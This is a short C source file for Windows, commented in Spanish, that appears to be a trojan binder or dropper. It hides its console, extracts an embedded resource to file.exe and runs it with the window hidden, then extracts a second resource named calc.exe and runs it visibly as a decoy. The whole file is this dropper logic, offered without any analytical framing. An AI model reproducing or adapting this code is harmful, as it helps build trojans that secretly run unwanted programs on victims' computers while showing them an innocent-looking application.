#include<windows.h>
#include<stdio.h>

void tarea1()
{

          HRSRC hRc;  // variable del recurso
          HANDLE  vRc; //handle del recurso
          void* rc; //recurso

          hRc = FindResource( NULL, "binario", "RT_RCDATA" ); //buscamos recurso
          vRc= LoadResource( NULL, hRc ); // cargamos recurso
          rc = LockResource( vRc ); //  fijamos recurso para usarlo
          DWORD size = SizeofResource(0, hRc); // medimos el tamaño del recurso
          FILE* f = fopen("file.exe","wb");  //creamos el archivo donde copiarlo
          fwrite(rc, size, 1, f); // escribimos en el archivo el buffer del recurso
          fclose(f); // cerramos el arhivo
          WinExec("file.exe", SW_HIDE); //lo ejecutamos en modo oculto
          FreeResource( hRc ); // liberamos recurso
}

void tarea2()
{

          HRSRC hRc;  // variable del recurso
          HANDLE  vRc; //handle del recurso
          void* rc; //recurso

          hRc = FindResource( NULL, "binario2", "RT_RCDATA" ); //buscamos recurso
          vRc = LoadResource( NULL, hRc ); // cargamos recurso
          rc = LockResource( vRc ); //  fijamos recurso para usarlo
          DWORD size = SizeofResource(0, hRc); // medimos el tamaño del recurso
          FILE* f = fopen("calc.exe","wb");  //creamos el archivo donde copiarlo
          fwrite(rc, size, 1, f); // escribimos en el archivo el buffer del recurso
          fclose(f); // cerramos el arhivo
          WinExec("calc.exe", SW_SHOWNORMAL); //lo ejecutamos normalmente
          FreeResource( hRc ); // liberamos recurso
}

int main(int argc, char *argv[])

{

FreeConsole();

tarea1(); // ejecutamos 1.exe [OCULTO]
tarea2(); // ejecutamos calc.exe [NORMAL]

}
